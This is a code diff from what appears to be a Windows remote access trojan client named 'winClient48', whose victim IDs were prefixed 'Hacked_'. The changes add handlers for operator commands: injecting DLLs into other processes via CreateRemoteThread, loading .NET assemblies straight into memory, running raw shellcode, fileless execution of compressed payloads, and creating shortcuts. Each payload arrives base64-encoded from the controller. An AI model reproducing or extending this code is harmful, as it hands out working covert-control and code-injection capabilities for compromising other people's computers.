@@ -167,7 +167,7 @@ namespace winClient48
         private int time_sendinfo = int.Parse("[INTERVAL]"); //1000; //ms
         private int dwTimeout = int.Parse("[TIMEOUT]"); //100000; //ms
         private bool send_screen = true;
-        private string id_prefix = "Hacked_";
+        private string id_prefix = "[PREFIX]";
         private string id_hardware = string.Empty;
 
         private ClientConfig clntConfig;
@@ -762,7 +762,7 @@ namespace winClient48
                             "zip",
 
                             //Folder State.
-                            string.Join(",", 
+                            string.Join(",",
                                 dInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                 .Select(x => Crypto.b64E2Str(x)).ToArray()
                             ),
@@ -839,7 +839,7 @@ namespace winClient48
 
                         v.SendCommand($"file|wget|status|{cmd[2]}|{Crypto.b64E2Str(x.Item3)}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                     }
-                    else if (cmd[1] == "ts")
+                    else if (cmd[1] == "ts") //File Timestamp
                     {
                         bool bIsFile = cmd[2] == "1";
                         string szFilePath = Crypto.b64D2Str(cmd[3]);
@@ -849,6 +849,18 @@ namespace winClient48
                         var x = funcFile.fnSetEntityTimestamp(bIsFile, szFilePath, etType, time);
 
                         v.SendCommand($"file|ts|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
+                    }
+                    else if (cmd[1] == "sc") //ShortCut
+                    {
+                        var scType = cmd[2] == "file" ? ShortCutsType.File : ShortCutsType.URL;
+                        string[] foo = new string[] { cmd[3], cmd[4], cmd[5] }.Select(s => Crypto.b64D2Str(s)).ToArray();
+                        string szSrc = foo[0];
+                        string szDest = foo[1];
+                        string szDesc = foo[2];
+
+                        var x = funcFile.fnCreateShortCuts(scType, szSrc, szDest, szDesc);
+
+                        v.SendCommand($"file|sc|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
                     }
                 }
 
@@ -1092,6 +1104,7 @@ namespace winClient48
                 }
                 #endregion
                 #region Connection Info
+
                 else if (cmd[0] == "conn")
                 {
                     if (funcConn == null)
@@ -1102,6 +1115,7 @@ namespace winClient48
                         v.encSend(2, 0, "conn|init|" + funcConn.GetConn());
                     }
                 }
+
                 #endregion
                 #region ServMgr
                 else if (cmd[0] == "serv")
@@ -1128,6 +1142,7 @@ namespace winClient48
                 }
                 #endregion
                 #region WindowMgr
+
                 else if (cmd[0] == "window")
                 {
                     if (funcWindow == null)
@@ -1171,6 +1186,7 @@ namespace winClient48
                         }
                     } 
                 }
+
                 #endregion
                 #region System Informaiton
                 else if (cmd[0] == "system") //WINDOWS SYSTEM (CONTROL PANEL)
@@ -2140,17 +2156,28 @@ namespace winClient48
 
                 else if (cmd[0] == "dll")
                 {
-                    if (cmd[1] == "inject")
-                    {
-                        int nPid = int.Parse(cmd[2]);
-                        byte[] abDllBuffer = Convert.FromBase64String(cmd[3]);
+                    DllLoaderMethod dlm = (DllLoaderMethod)int.Parse(cmd[1]);
+                    byte[] abBuffer = Convert.FromBase64String(cmd[2]);
 
-                        var x = DllLoader.Inject(nPid, abDllBuffer);
-                    }
-                    else if (cmd[1] == "load")
-                    {
+                    (int nCode, string szMsg) x = (0, "Do nothing.");
 
+                    switch (dlm)
+                    {
+                        case DllLoaderMethod.CreateRemoteThread:
+                            int nProcId = int.Parse(cmd[3]);
+                            x = clsLoader.fnRemoteThread(abBuffer, nProcId);
+                            break;
+                        case DllLoaderMethod.DotNetAssemblyLoad:
+                            string szTypeName = cmd[3];
+                            string szMethod = cmd[4];
+                            x = clsLoader.fnLoadDotNetDll(abBuffer, szTypeName, szMethod);
+                            break;
+                        case DllLoaderMethod.ShellCode:
+                            x = clsLoader.fnInjectShellCode(abBuffer);
+                            break;
                     }
+
+                    v.SendCommand($"dll|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
                 }
 
                 #endregion
@@ -2158,15 +2185,11 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
-                    MessageBox.Show("A");
-
                     string[] alpArgs = cmd[1].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                     byte[] abAssembly = Convert.FromBase64String(cmd[2]);
                     abAssembly = clsEZData.abGzipDecompress(abAssembly);
 
                     installer.fnLoadToMemory(alpArgs, abAssembly);
-
-                    MessageBox.Show("B");
                 }
 
                 #endregion
